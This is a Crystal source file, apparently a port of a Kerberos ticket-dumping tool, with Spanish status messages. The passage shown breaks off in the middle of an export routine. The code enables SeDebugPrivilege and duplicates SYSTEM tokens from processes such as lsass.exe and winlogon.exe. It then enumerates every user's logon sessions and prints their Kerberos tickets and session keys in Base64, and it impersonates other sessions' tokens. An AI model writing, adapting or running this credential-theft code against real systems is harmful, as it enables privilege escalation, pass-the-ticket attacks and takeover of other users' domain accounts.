@[Link("secur32")]
@[Link("advapi32")]
@[Link("kernel32")]
@[Link("shell32")]
lib LibWin
  struct Luid
    low_part : UInt32
    high_part : Int32
  end

  struct LargeInteger
    quad_part : Int64
  end

  struct LsaUnicodeString
    length : UInt16
    maximum_length : UInt16
    buffer : UInt16*
  end

  struct LsaString
    length : UInt16
    maximum_length : UInt16
    buffer : UInt8*
  end

  struct SecurityLogonSessionData
    size : UInt32
    logon_id : Luid
    user_name : LsaUnicodeString
    logon_domain : LsaUnicodeString
    authentication_package : LsaUnicodeString
    logon_type : UInt32
    session : UInt32
    sid : Void*
    logon_time : LargeInteger
    logon_server : LsaUnicodeString
    dns_domain_name : LsaUnicodeString
    upn : LsaUnicodeString
  end

  struct TokenStatistics
    token_id : Luid
    authentication_id : Luid
    expiration_time : LargeInteger
    token_type : UInt32
    impersonation_level : UInt32
    dynamic_charged : UInt32
    dynamic_available : UInt32
    group_count : UInt32
    privilege_count : UInt32
    modified_id : Luid
  end

  struct KerbQueryTktCacheRequest
    message_type : UInt32
    logon_id : Luid
  end

  struct KerbQueryTktCacheResponse
    message_type : UInt32
    count_of_tickets : UInt32
  end

  struct KerbTicketCacheInfo
    server_name : LsaUnicodeString
    realm_name : LsaUnicodeString
    start_time : LargeInteger
    end_time : LargeInteger
    renew_time : LargeInteger
    encryption_type : Int32
    ticket_flags : UInt32
  end

  struct KerbTicketCacheInfoEx
    client_name : LsaUnicodeString
    client_realm : LsaUnicodeString
    server_name : LsaUnicodeString
    server_realm : LsaUnicodeString
    start_time : LargeInteger
    end_time : LargeInteger
    renew_time : LargeInteger
    encryption_type : Int32
    ticket_flags : UInt32
  end

  struct LuidAndAttributes
    luid : Luid
    attributes : UInt32
  end

  struct TokenPrivileges
    privilege_count : UInt32
    privileges : LuidAndAttributes[1]
  end

  struct KerbCryptoKey
    key_type : Int32
    length : UInt32
    value : UInt8*
  end

  struct KerbExternalTicket
    service_name : Void*
    target_name : Void*
    client_name : Void*
    domain_name : LsaUnicodeString
    target_domain_name : LsaUnicodeString
    alt_target_domain_name : LsaUnicodeString
    session_key : KerbCryptoKey
    ticket_flags : UInt32
    flags : UInt32
    key_expiration_time : LargeInteger
    start_time : LargeInteger
    end_time : LargeInteger
    renew_until : LargeInteger
    time_skew : LargeInteger
    encoded_ticket_size : Int32
    encoded_ticket : UInt8*
  end

  struct KerbRetrieveTktResponse
    ticket : KerbExternalTicket
  end

  struct SecurityHandle
    low_part : Void*
    high_part : Void*
  end

  struct KerbRetrieveTktRequest
    message_type : UInt32
    logon_id : Luid
    target_name : LsaUnicodeString
    ticket_flags : UInt32
    cache_options : UInt32
    encryption_type : Int32
    credentials_handle : SecurityHandle
  end

  struct KerbCryptoKey32
    key_type : Int32
    length : UInt32
    offset : UInt32
  end

  struct KerbSubmitTktRequest
    message_type : UInt32
    logon_id : Luid
    flags : UInt32
    key : KerbCryptoKey32
    kerb_cred_size : UInt32
    kerb_cred_offset : UInt32
  end

  fun LsaConnectUntrusted(lsa_handle : Void**) : Int32
  fun LsaLookupAuthenticationPackage(lsa_handle : Void*, package_name : LsaString*, authentication_package : UInt32*) : Int32
  fun LsaCallAuthenticationPackage(lsa_handle : Void*, authentication_package : UInt32, protocol_submit_buffer : Void*, submit_buffer_length : UInt32, protocol_return_buffer : Void**, return_buffer_length : UInt32*, protocol_status : Int32*) : Int32
  fun LsaFreeReturnBuffer(buffer : Void*) : Int32
  fun LsaEnumerateLogonSessions(logon_session_count : UInt32*, logon_session_list : Luid**) : Int32
  fun LsaGetLogonSessionData(logon_id : Luid*, pp_logon_session_data : SecurityLogonSessionData**) : Int32
  fun LsaDeregisterLogonProcess(lsa_handle : Void*) : Int32

  fun OpenProcessToken(process_handle : Void*, desired_access : UInt32, token_handle : Void**) : Int32
  fun GetTokenInformation(token_handle : Void*, token_information_class : UInt32, token_information : Void*, token_information_length : UInt32, return_length : UInt32*) : Int32
  fun LookupPrivilegeValueW(lp_system_name : UInt16*, lp_name : UInt16*, lp_luid : Luid*) : Int32
  fun AdjustTokenPrivileges(token_handle : Void*, disable_all_privileges : Int32, new_state : TokenPrivileges*, buffer_length : UInt32, previous_state : Void*, return_length : UInt32*) : Int32
  fun DuplicateToken(existing_token_handle : Void*, impersonation_level : UInt32, duplicate_token_handle : Void**) : Int32
  fun DuplicateTokenEx(h_existing_token : Void*, dw_desired_access : UInt32, lp_token_attributes : Void*, impersonation_level : UInt32, token_type : UInt32, ph_new_token : Void**) : Int32
  fun ImpersonateLoggedOnUser(h_token : Void*) : Int32
  fun RevertToSelf : Int32

  fun GetCurrentProcess : Void*
  fun GetCurrentProcessId : UInt32
  fun CloseHandle(h_object : Void*) : Int32
  fun GetLastError : UInt32
  fun OpenProcess(process_access : UInt32, inherit_handle : Int32, process_id : UInt32) : Void*
  fun CreateToolhelp32Snapshot(dw_flags : UInt32, th32_process_id : UInt32) : Void*
  fun ProcessIdToSessionId(dw_process_id : UInt32, psession_id : UInt32*) : Int32

  fun IsUserAnAdmin : Int32
end


TOKEN_QUERY                        = 0x0008_u32
TOKEN_ADJUST_PRIVILEGES            = 0x0020_u32
TOKEN_DUPLICATE                    = 0x0002_u32
TOKEN_STATISTICS_INFO_CLASS        = 10_u32
SE_PRIVILEGE_ENABLED               = 0x00000002_u32
SE_DEBUG_NAME                      = "SeDebugPrivilege"
SECURITY_IMPERSONATION             = 2_u32
PROCESS_QUERY_INFORMATION          = 0x0400_u32
PROCESS_QUERY_LIMITED_INFORMATION  = 0x1000_u32
TH32CS_SNAPPROCESS                 = 0x00000002_u32
KERB_QUERY_TKT_CACHE_MSG           = 1_u32
KERB_RETRIEVE_ENCODED_MSG          = 8_u32
KERB_QUERY_TKT_CACHE_EX_MSG        = 14_u32
KERB_RETRIEVE_AS_KERB_CRED         = 0x8_u32
KERB_SUBMIT_TKT_MSG                = 21_u32
MAXIMUM_ALLOWED                    = 0x02000000_u32
TOKEN_IMPERSONATION                = 2_u32

SYSTEM_PROCESS_CANDIDATES = ["winlogon.exe", "wininit.exe", "services.exe", "lsass.exe", "smss.exe"]

LOGON_TYPE_NAMES = {
  0_u32  => "Unknown",
  2_u32  => "Interactive",
  3_u32  => "Network",
  4_u32  => "Batch",
  5_u32  => "Service",
  7_u32  => "Unlock",
  8_u32  => "NetworkCleartext",
  9_u32  => "NewCredentials",
  10_u32 => "RemoteInteractive",
  11_u32 => "CachedInteractive",
}

ENCRYPTION_TYPES = {
  1  => "DES-CBC-CRC",
  3  => "DES-CBC-MD5",
  17 => "AES-128-CTS-HMAC-SHA1-96",
  18 => "AES-256-CTS-HMAC-SHA1-96",
  23 => "RC4-HMAC",
  24 => "RC4-HMAC-EXP",
}

record TgtInfo, logon_id : UInt32, username : String, domain : String, service_name : String

G_TGT_LIST = [] of TgtInfo


def lsa_unicode_to_string(us : LibWin::LsaUnicodeString) : String
  return "" if us.length == 0 || us.buffer.null?
  char_count = us.length // 2
  String.from_utf16(Slice.new(us.buffer, char_count))
rescue
  ""
end


def filetime_to_time(large_int : LibWin::LargeInteger) : Time
  return Time.utc(1601, 1, 1) if large_int.quad_part == 0
  unix_epoch_offset = 116444736000000000_i64
  unix_microseconds = (large_int.quad_part - unix_epoch_offset) // 10
  Time.unix_ms(unix_microseconds // 1000)
rescue
  Time.utc(1601, 1, 1)
end


def format_ticket_flags(flags : UInt32) : String
  names = [] of String
  names << "forwardable"       if (flags & 0x40000000_u32) != 0
  names << "forwarded"         if (flags & 0x20000000_u32) != 0
  names << "proxiable"         if (flags & 0x10000000_u32) != 0
  names << "proxy"             if (flags & 0x08000000_u32) != 0
  names << "may_postdate"      if (flags & 0x04000000_u32) != 0
  names << "postdated"         if (flags & 0x02000000_u32) != 0
  names << "invalid"           if (flags & 0x01000000_u32) != 0
  names << "renewable"         if (flags & 0x00800000_u32) != 0
  names << "initial"           if (flags & 0x00400000_u32) != 0
  names << "pre_authent"       if (flags & 0x00200000_u32) != 0
  names << "hw_authent"        if (flags & 0x00100000_u32) != 0
  names << "ok_as_delegate"    if (flags & 0x00040000_u32) != 0
  names << "name_canonicalize" if (flags & 0x00010000_u32) != 0
  names.empty? ? "0" : names.join(" ")
end


def current_session_id : UInt32
  sid = 0_u32
  LibWin.ProcessIdToSessionId(LibWin.GetCurrentProcessId, pointerof(sid))
  sid
end


def enable_debug_privilege : Bool
  h_process = LibWin.GetCurrentProcess
  h_token = Pointer(Void).null

  ret = LibWin.OpenProcessToken(h_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, pointerof(h_token))
  if ret == 0
    return false
  end

  luid = uninitialized LibWin::Luid
  name_utf16 = SE_DEBUG_NAME.to_utf16
  ret2 = LibWin.LookupPrivilegeValueW(Pointer(UInt16).null, name_utf16, pointerof(luid))
  if ret2 == 0
    LibWin.CloseHandle(h_token)
    return false
  end

  tp = uninitialized LibWin::TokenPrivileges
  tp.privilege_count = 1
  tp.privileges[0].luid = luid
  tp.privileges[0].attributes = SE_PRIVILEGE_ENABLED

  ret3 = LibWin.AdjustTokenPrivileges(h_token, 0, pointerof(tp), 0_u32, Pointer(Void).null, Pointer(UInt32).null)
  gle = LibWin.GetLastError

  LibWin.CloseHandle(h_token)

  if ret3 == 0
    return false
  end

  if gle == 1300_u32
    return false
  end

  puts "[+] SeDebugPrivilege habilitado exitosamente"
  true
end


def get_current_logon_id : LibWin::Luid?
  h_process = LibWin.GetCurrentProcess
  h_token = Pointer(Void).null
  return nil if LibWin.OpenProcessToken(h_process, TOKEN_QUERY, pointerof(h_token)) == 0

  stats = uninitialized LibWin::TokenStatistics
  return_length = 0_u32
  success = LibWin.GetTokenInformation(
    h_token, TOKEN_STATISTICS_INFO_CLASS,
    pointerof(stats).as(Void*), sizeof(LibWin::TokenStatistics).to_u32,
    pointerof(return_length)
  )
  LibWin.CloseHandle(h_token)
  return nil if success == 0
  stats.authentication_id
end


def print_current_logon_id
  if luid = get_current_logon_id
    puts "Current LogonId is #{luid.high_part}:0x#{luid.low_part.to_s(16)}"
  end
end


def get_all_pids_of_name(process_name : String) : Array(UInt32)
  pids = [] of UInt32
  h_snapshot = LibWin.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32)
  return pids if h_snapshot == Pointer(Void).new(UInt64::MAX)

  snapshot_handle = h_snapshot.as(LibC::HANDLE)
  pe = uninitialized LibC::PROCESSENTRY32W
  pe.dwSize = sizeof(LibC::PROCESSENTRY32W).to_u32

  if LibC.Process32FirstW(snapshot_handle, pointerof(pe)) != 0
    loop do
      exe_name = String.from_utf16(pe.szExeFile.to_unsafe)[0].rstrip('\0')
      pids << pe.th32ProcessID if exe_name.downcase == process_name.downcase
      break if LibC.Process32NextW(snapshot_handle, pointerof(pe)) == 0
    end
  end

  LibWin.CloseHandle(h_snapshot)
  pids
end


def get_process_id_of_name(process_name : String) : UInt32
  get_all_pids_of_name(process_name).first? || 0_u32
end


def try_open_process_for_token(pid : UInt32) : Void*
  h = LibWin.OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid)
  unless h.null?
    return h
  end

  h = LibWin.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
  unless h.null?
    return h
  end

  Pointer(Void).null
end


def get_system : Bool
  my_session = current_session_id

  SYSTEM_PROCESS_CANDIDATES.each do |proc_name|
    pids = get_all_pids_of_name(proc_name)
    if pids.empty?
      next
    end

    pids.each do |pid|
      proc_session = 0_u32
      LibWin.ProcessIdToSessionId(pid, pointerof(proc_session))

      h_process = try_open_process_for_token(pid)
      next if h_process.null?

      h_token = Pointer(Void).null
      ret = LibWin.OpenProcessToken(h_process, TOKEN_DUPLICATE, pointerof(h_token))
      if ret == 0
        ret = LibWin.OpenProcessToken(h_process, TOKEN_QUERY | TOKEN_DUPLICATE, pointerof(h_token))
        if ret == 0
          LibWin.CloseHandle(h_process)
          next
        end
      end

      h_dup_token = Pointer(Void).null
      ret = LibWin.DuplicateToken(h_token, SECURITY_IMPERSONATION, pointerof(h_dup_token))
      if ret == 0
        ret = LibWin.DuplicateTokenEx(
          h_token, MAXIMUM_ALLOWED, Pointer(Void).null,
          SECURITY_IMPERSONATION, TOKEN_IMPERSONATION, pointerof(h_dup_token)
        )
        if ret == 0
          LibWin.CloseHandle(h_token)
          LibWin.CloseHandle(h_process)
          next
        end
      end

      ret = LibWin.ImpersonateLoggedOnUser(h_dup_token)
      if ret == 0
        LibWin.CloseHandle(h_dup_token)
        LibWin.CloseHandle(h_token)
        LibWin.CloseHandle(h_process)
        next
      end

      LibWin.CloseHandle(h_token)
      LibWin.CloseHandle(h_dup_token)
      LibWin.CloseHandle(h_process)
      return true
    end
  end

  false
end


def get_lsa_handle : Void*
  lsa_handle = Pointer(Void).null
  is_admin = LibWin.IsUserAnAdmin

  if is_admin != 0
    unless get_system
      return Pointer(Void).null
    end
    status = LibWin.LsaConnectUntrusted(pointerof(lsa_handle))
    LibWin.RevertToSelf
    if status != 0
      return Pointer(Void).null
    end
  else
    status = LibWin.LsaConnectUntrusted(pointerof(lsa_handle))
    if status != 0
      return Pointer(Void).null
    end
  end

  lsa_handle
end


def lookup_kerberos_package(lsa_handle : Void*) : UInt32?
  pkg_name_bytes = "Kerberos".to_slice
  pkg_name = LibWin::LsaString.new
  pkg_name.length = pkg_name_bytes.size.to_u16
  pkg_name.maximum_length = (pkg_name_bytes.size + 1).to_u16
  pkg_name.buffer = pkg_name_bytes.to_unsafe

  auth_pack = 0_u32
  status = LibWin.LsaLookupAuthenticationPackage(lsa_handle, pointerof(pkg_name), pointerof(auth_pack))
  if status != 0
    puts "[-] LsaLookupAuthenticationPackage falló status=0x#{status.to_s(16).rjust(8, '0')}"
    return nil
  end
  auth_pack
end


def impersonate_session(target_logon_id : UInt32) : Void*
  h_snapshot = LibWin.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32)
  return Pointer(Void).null if h_snapshot == Pointer(Void).new(UInt64::MAX)

  snapshot_handle = h_snapshot.as(LibC::HANDLE)
  pe = uninitialized LibC::PROCESSENTRY32W
  pe.dwSize = sizeof(LibC::PROCESSENTRY32W).to_u32

  if LibC.Process32FirstW(snapshot_handle, pointerof(pe)) != 0
    loop do
      h_process = LibWin.OpenProcess(PROCESS_QUERY_INFORMATION, 0, pe.th32ProcessID)
      h_process = LibWin.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pe.th32ProcessID) if h_process.null?
      unless h_process.null?
        h_token = Pointer(Void).null
        if LibWin.OpenProcessToken(h_process, TOKEN_QUERY | TOKEN_DUPLICATE, pointerof(h_token)) != 0
          stats = uninitialized LibWin::TokenStatistics
          return_length = 0_u32
          if LibWin.GetTokenInformation(
               h_token, TOKEN_STATISTICS_INFO_CLASS,
               pointerof(stats).as(Void*), sizeof(LibWin::TokenStatistics).to_u32,
               pointerof(return_length)
             ) != 0
            if stats.authentication_id.low_part == target_logon_id
              h_imp_token = Pointer(Void).null
              if LibWin.DuplicateTokenEx(h_token, MAXIMUM_ALLOWED, Pointer(Void).null,
                   SECURITY_IMPERSONATION, TOKEN_IMPERSONATION, pointerof(h_imp_token)) != 0
                LibWin.CloseHandle(h_token)
                LibWin.CloseHandle(h_process)
                LibWin.CloseHandle(h_snapshot)
                return h_imp_token
              end
            end
          end
          LibWin.CloseHandle(h_token)
        end
        LibWin.CloseHandle(h_process)
      end
      break if LibC.Process32NextW(snapshot_handle, pointerof(pe)) == 0
    end
  end

  LibWin.CloseHandle(h_snapshot)
  Pointer(Void).null
end


def add_tgt_to_list(logon_id : UInt32, username : String, domain : String, service_name : String)
  return if G_TGT_LIST.any? { |t| t.logon_id == logon_id && t.service_name == service_name }
  G_TGT_LIST << TgtInfo.new(
    logon_id: logon_id,
    username: username.empty? ? "(unknown)" : username,
    domain: domain.empty? ? "(unknown)" : domain,
    service_name: service_name.empty? ? "(unknown)" : service_name
  )
end


def request_service_ticket(lsa_handle : Void*, auth_pack : UInt32, logon_id : LibWin::Luid, target_name : String, ticket_flags : UInt32) : {Bytes?, Bytes?, Int32}
  target_utf16 = target_name.to_utf16
  target_bytes = Slice(UInt8).new(target_utf16.to_unsafe.as(UInt8*), target_utf16.size * 2)

  struct_size = sizeof(LibWin::KerbRetrieveTktRequest)
  total_size = struct_size + target_bytes.size + 2

  buffer = Bytes.new(total_size)
  req_ptr = buffer.to_unsafe.as(LibWin::KerbRetrieveTktRequest*)
  req_ptr.value.message_type = KERB_RETRIEVE_ENCODED_MSG
  req_ptr.value.logon_id = logon_id
  req_ptr.value.target_name.length = target_bytes.size.to_u16
  req_ptr.value.target_name.maximum_length = (target_bytes.size + 2).to_u16
  req_ptr.value.target_name.buffer = (buffer.to_unsafe + struct_size).as(UInt16*)
  req_ptr.value.ticket_flags = ticket_flags
  req_ptr.value.cache_options = KERB_RETRIEVE_AS_KERB_CRED
  req_ptr.value.encryption_type = 0_i32

  target_bytes.each_with_index { |b, i| buffer[struct_size + i] = b }

  response_ptr = Pointer(Void).null
  response_size = 0_u32
  protocol_status = 0_i32

  status = LibWin.LsaCallAuthenticationPackage(
    lsa_handle, auth_pack, buffer.to_unsafe.as(Void*), total_size.to_u32,
    pointerof(response_ptr), pointerof(response_size), pointerof(protocol_status)
  )

  return {nil, nil, 0} if status != 0 || protocol_status != 0 || response_size == 0 || response_ptr.null?

  resp = response_ptr.as(LibWin::KerbRetrieveTktResponse*).value
  ticket_bytes = nil
  session_key_bytes = nil
  key_type = 0

  if resp.ticket.encoded_ticket_size > 0 && !resp.ticket.encoded_ticket.null?
    ticket_bytes = Bytes.new(resp.ticket.encoded_ticket_size)
    resp.ticket.encoded_ticket.copy_to(ticket_bytes.to_unsafe, resp.ticket.encoded_ticket_size)
  end

  if resp.ticket.session_key.length > 0 && !resp.ticket.session_key.value.null?
    session_key_bytes = Bytes.new(resp.ticket.session_key.length)
    resp.ticket.session_key.value.copy_to(session_key_bytes.to_unsafe, resp.ticket.session_key.length)
    key_type = resp.ticket.session_key.key_type
  end

  LibWin.LsaFreeReturnBuffer(response_ptr)
  {ticket_bytes, session_key_bytes, key_type}
rescue
  {nil, nil, 0}
end


require "base64"


def enumerate_logon_sessions
  session_count = 0_u32
  session_list = Pointer(LibWin::Luid).null

  status = LibWin.LsaEnumerateLogonSessions(pointerof(session_count), pointerof(session_list))
  if status != 0
    puts "[-] LsaEnumerateLogonSessions falló status=0x#{status.to_s(16).rjust(8, '0')}"
    return
  end

  puts ""
  session_count.times do |i|
    session_luid = (session_list + i).value
    session_data = Pointer(LibWin::SecurityLogonSessionData).null
    next if LibWin.LsaGetLogonSessionData(pointerof(session_luid), pointerof(session_data)) != 0
    next if session_data.null?

    sd = session_data.value
    domain = lsa_unicode_to_string(sd.logon_domain)
    username = lsa_unicode_to_string(sd.user_name)
    auth_package = lsa_unicode_to_string(sd.authentication_package)
    logon_type_str = LOGON_TYPE_NAMES[sd.logon_type]? || "(#{sd.logon_type})"

    puts "[#{i}] Session #{sd.session} #{session_luid.high_part}:0x#{session_luid.low_part.to_s(16)} #{domain}\\#{username} #{auth_package}:#{logon_type_str}"
    LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
  end

  LibWin.LsaFreeReturnBuffer(session_list.as(Void*))
end


def enumerate_my_tickets
  lsa_handle = Pointer(Void).null
  if LibWin.LsaConnectUntrusted(pointerof(lsa_handle)) != 0
    puts "[-] LsaConnectUntrusted falló GLE=#{LibWin.GetLastError}"
    return
  end

  auth_pack = lookup_kerberos_package(lsa_handle)
  unless auth_pack
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  req = LibWin::KerbQueryTktCacheRequest.new
  req.message_type = KERB_QUERY_TKT_CACHE_MSG
  req.logon_id = LibWin::Luid.new

  response_ptr = Pointer(Void).null
  response_size = 0_u32
  protocol_status = 0_i32

  status = LibWin.LsaCallAuthenticationPackage(
    lsa_handle, auth_pack, pointerof(req).as(Void*),
    sizeof(LibWin::KerbQueryTktCacheRequest).to_u32,
    pointerof(response_ptr), pointerof(response_size), pointerof(protocol_status)
  )

  if status != 0 || protocol_status != 0 || response_ptr.null?
    puts "[-] KerbQueryTicketCache falló status=0x#{status.to_s(16)} proto=0x#{protocol_status.to_s(16)}"
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  cache_response = response_ptr.as(LibWin::KerbQueryTktCacheResponse*).value
  ticket_count = cache_response.count_of_tickets
  puts "Cached Tickets: (#{ticket_count})\n\n"

  if ticket_count == 0
    LibWin.LsaFreeReturnBuffer(response_ptr)
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  username = "unknown"
  if raw_luid = get_current_logon_id
    luid = raw_luid
    session_data = Pointer(LibWin::SecurityLogonSessionData).null
    if LibWin.LsaGetLogonSessionData(pointerof(luid), pointerof(session_data)) == 0 && !session_data.null?
      username = lsa_unicode_to_string(session_data.value.user_name)
      LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
    end
  end

  ticket_base = response_ptr.as(UInt8*) + sizeof(LibWin::KerbQueryTktCacheResponse)
  ticket_count.times do |i|
    ticket = (ticket_base + i * sizeof(LibWin::KerbTicketCacheInfo)).as(LibWin::KerbTicketCacheInfo*).value
    server_name = lsa_unicode_to_string(ticket.server_name)
    realm_name = lsa_unicode_to_string(ticket.realm_name)
    start_time = filetime_to_time(ticket.start_time)
    end_time = filetime_to_time(ticket.end_time)
    renew_time = filetime_to_time(ticket.renew_time)
    enc_type = ENCRYPTION_TYPES[ticket.encryption_type]? || "Unknown (#{ticket.encryption_type})"
    flags_str = format_ticket_flags(ticket.ticket_flags)

    puts "##{i}>     Client: #{username} @ #{realm_name}"
    puts "        Server: #{server_name} @ #{realm_name}"
    puts "        KerbTicket Encryption Type: #{enc_type}"
    puts "        Ticket Flags 0x#{ticket.ticket_flags.to_s(16)} -> #{flags_str}"
    puts "        Start Time: #{start_time.to_local.to_s("%m/%d/%Y %H:%M:%S")} (local)"
    puts "        End Time:   #{end_time.to_local.to_s("%m/%d/%Y %H:%M:%S")} (local)"
    puts "        Renew Time: #{renew_time.to_local.to_s("%m/%d/%Y %H:%M:%S")} (local)"
    puts "        Cache Flags: 0x1 -> PRIMARY"
    puts "        Kdc Called:\n\n"
  end

  LibWin.LsaFreeReturnBuffer(response_ptr)
  LibWin.LsaDeregisterLogonProcess(lsa_handle)
end


def enumerate_all_tickets
  puts "[*] Action: Dump Kerberos Ticket Data (All Users)\n\n"

  if luid = get_current_logon_id
    combined = ((luid.high_part.to_u64 << 32) | luid.low_part.to_u64)
    puts "[*] Current LUID    : 0x#{combined.to_s(16)}\n\n"
  end

  enable_debug_privilege

  lsa_handle = get_lsa_handle
  if lsa_handle.null?
    puts "[-] Error al obtener handle LSA"
    return
  end

  auth_pack = lookup_kerberos_package(lsa_handle)
  unless auth_pack
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  session_count = 0_u32
  session_list = Pointer(LibWin::Luid).null
  if LibWin.LsaEnumerateLogonSessions(pointerof(session_count), pointerof(session_list)) != 0
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  total_sessions = 0
  sessions_with_tickets = 0
  total_tickets = 0
  tgt_count = 0
  service_count = 0

  session_count.times do |i|
    session_luid = (session_list + i).value
    session_data = Pointer(LibWin::SecurityLogonSessionData).null
    next if LibWin.LsaGetLogonSessionData(pointerof(session_luid), pointerof(session_data)) != 0
    next if session_data.null?

    sd = session_data.value
    username = lsa_unicode_to_string(sd.user_name)
    domain = lsa_unicode_to_string(sd.logon_domain)

    if username.empty?
      LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
      next
    end

    total_sessions += 1

    req = LibWin::KerbQueryTktCacheRequest.new
    req.message_type = KERB_QUERY_TKT_CACHE_EX_MSG
    req.logon_id = session_luid

    response_ptr = Pointer(Void).null
    response_size = 0_u32
    protocol_status = 0_i32

    status = LibWin.LsaCallAuthenticationPackage(
      lsa_handle, auth_pack, pointerof(req).as(Void*),
      sizeof(LibWin::KerbQueryTktCacheRequest).to_u32,
      pointerof(response_ptr), pointerof(response_size), pointerof(protocol_status)
    )

    if status != 0 || protocol_status != 0 || response_ptr.null?
      LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
      next
    end

    cache_response = response_ptr.as(LibWin::KerbQueryTktCacheResponse*).value
    ticket_count = cache_response.count_of_tickets

    if ticket_count == 0
      LibWin.LsaFreeReturnBuffer(response_ptr)
      LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
      next
    end

    sessions_with_tickets += 1
    total_tickets += ticket_count.to_i

    auth_package = lsa_unicode_to_string(sd.authentication_package)
    logon_type = LOGON_TYPE_NAMES[sd.logon_type]? || "Unknown"
    logon_time = filetime_to_time(sd.logon_time)
    logon_server = lsa_unicode_to_string(sd.logon_server)
    dns_domain = lsa_unicode_to_string(sd.dns_domain_name)
    upn = lsa_unicode_to_string(sd.upn)

    puts "  UserName                 : #{username}"
    puts "  Domain                   : #{domain}"
    puts "  LogonId                  : 0x#{session_luid.low_part.to_s(16)}"
    puts "  UserSID                  : [SID]"
    puts "  AuthenticationPackage    : #{auth_package}"
    puts "  LogonType                : #{logon_type}"
    puts "  LogonTime                : #{logon_time.to_local.to_s("%m/%d/%Y %H:%M:%S")}"
    puts "  LogonServer              : #{logon_server}"
    puts "  LogonServerDNSDomain     : #{dns_domain}"
    puts "  UserPrincipalName        : #{upn}"
    puts ""

    ticket_base = response_ptr.as(UInt8*) + sizeof(LibWin::KerbQueryTktCacheResponse)
    ticket_count.times do |j|
      ti = (ticket_base + j * sizeof(LibWin::KerbTicketCacheInfoEx)).as(LibWin::KerbTicketCacheInfoEx*).value
      client_name = lsa_unicode_to_string(ti.client_name)
      client_realm = lsa_unicode_to_string(ti.client_realm)
      server_name = lsa_unicode_to_string(ti.server_name)
      server_realm = lsa_unicode_to_string(ti.server_realm)
      start_time = filetime_to_time(ti.start_time)
      end_time = filetime_to_time(ti.end_time)
      renew_time = filetime_to_time(ti.renew_time)
      flags_str = format_ticket_flags(ti.ticket_flags)

      is_tgt = server_name.downcase.includes?("krbtgt")
      is_tgt ? (tgt_count += 1) : (service_count += 1)

      puts "\n    ServiceName              :  #{server_name}"
      puts "    ServiceRealm             :  #{server_realm}"
      puts "    UserName                 :  #{client_name}"
      puts "    UserRealm                :  #{client_realm}"
      puts "    StartTime                :  #{start_time.to_local.to_s("%m/%d/%Y %H:%M:%S")}"
      puts "    EndTime                  :  #{end_time.to_local.to_s("%m/%d/%Y %H:%M:%S")}"
      puts "    RenewTill                :  #{renew_time.to_local.to_s("%m/%d/%Y %H:%M:%S")}"
      puts "    Flags                    :  #{flags_str}"

      ticket_bytes, session_key_bytes, key_type = request_service_ticket(
        lsa_handle, auth_pack, session_luid, server_name, ti.ticket_flags
      )

      if session_key_bytes
        key_enc_type = ENCRYPTION_TYPES[key_type]? || "Unknown (#{key_type})"
        puts "    Session Key Type         :  #{key_enc_type}"
        puts "    Base64(key)              :  #{Base64.strict_encode(session_key_bytes)}"
      else
        puts "    Base64(key)              :  (no disponible)"
      end

      puts "    Base64EncodedTicket   :"
      if ticket_bytes
        puts "      #{Base64.strict_encode(ticket_bytes)}"
      else
        puts "      (error al recuperar – usar comando export)"
      end

      puts ""
    end

    LibWin.LsaFreeReturnBuffer(response_ptr)
    LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
  end

  puts "=" * 80
  puts "  RESUMEN"
  puts "=" * 80
  puts "Total de sesiones de logon analizadas: #{total_sessions}"
  puts "Sesiones con tickets Kerberos: #{sessions_with_tickets}"
  puts "Total de tickets encontrados: #{total_tickets}"
  puts "  - TGTs: #{tgt_count}"
  puts "  - Service Tickets: #{service_count}"

  LibWin.LsaFreeReturnBuffer(session_list.as(Void*))
  LibWin.LsaDeregisterLogonProcess(lsa_handle)
end


def export_ticket(logon_id_str : String)
  target_logon_id = begin
    logon_id_str.starts_with?("0x") || logon_id_str.starts_with?("0X") ?
      logon_id_str[2..].to_u32(16) : logon_id_str.to_u32(16)
  rescue
    puts "Error: Formato de LogonId inválido. Usar formato hex como 0x79fb3 o 79fb3"
    return
  end

  enable_debug_privilege

  session_count = 0_u32
  session_list = Pointer(LibWin::Luid).null
  if LibWin.LsaEnumerateLogonSessions(pointerof(session_count), pointerof(session_list)) != 0
    puts "[-] Error al enumerar sesiones de logon"
    return
  end

  target_luid = nil
  username = ""
  domain = ""

  session_count.times do |i|
    luid = (session_list + i).value
    next unless luid.low_part == target_logon_id
    target_luid = luid
    session_data = Pointer(LibWin::SecurityLogonSessionData).null
    if LibWin.LsaGetLogonSessionData(pointerof(luid), pointerof(session_data)) == 0 && !session_data.null?
      username = lsa_unicode_to_string(session_data.value.user_name)
      domain = lsa_unicode_to_string(session_data.value.logon_domain)
      LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
    end
    break
  end
  LibWin.LsaFreeReturnBuffer(session_list.as(Void*))

  unless target_luid
    puts "Error: LogonId 0x#{target_logon_id.to_s(16)} no encontrado"
    return
  end

  lsa_handle = get_lsa_handle
  if lsa_handle.null?
    puts "[-] Error al obtener handle LSA"
    return
  end

  h_imp_token = impersonate_session(target_logon_id)
  need_revert = false
  unless h_imp_token.null?
    if LibWin.ImpersonateLoggedOnUser(h_imp_token) != 0
      need_revert = true
    else
      LibWin.CloseHandle(h_imp_token)
      h_imp_token = Pointer(Void).null
    end
  end

  auth_pack = lookup_kerberos_package(lsa_handle)
  unless auth_pack
    puts "[-] Error al encontrar paquete Kerberos"
    LibWin.RevertToSelf if need_revert
    LibWin.CloseHandle(h_imp_token) if need_revert
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  req = LibWin::KerbQueryTktCacheRequest.new
  req.message_type = KERB_QUERY_TKT_CACHE_MSG
